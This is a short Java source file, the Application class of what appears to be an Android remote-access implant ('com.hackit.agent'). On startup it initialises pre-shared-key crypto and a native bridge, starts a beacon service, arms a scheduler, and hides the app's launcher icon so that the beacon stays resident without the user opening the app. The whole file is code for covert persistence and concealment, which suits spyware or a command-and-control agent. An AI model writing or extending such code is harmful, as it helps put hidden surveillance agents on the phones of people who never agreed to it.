package com.hackit.agent;

import android.app.Application;
import android.content.Context;

/** Loads config early and keeps the beacon resident without a launcher tap. */
public class AgentApp extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            Config config = Config.get(this);
            Crypto.init(config.psk);
            NativeBridge.init(this, config, Common.sid(this));
            BeaconService.start(this);
            Scheduler.arm(this);
            if (config.hideIcon) {
                Launcher.setEnabled(this, false);
            }
        } catch (Throwable exc) {
            Log.e("app: " + exc);
        }
    }

    /** Survives on API 21 where {@code getInstance()} is unavailable. */
    static Context ctx() {
        return sSelf;
    }

    private static Context sSelf;

    {
        sSelf = this;
    }
}
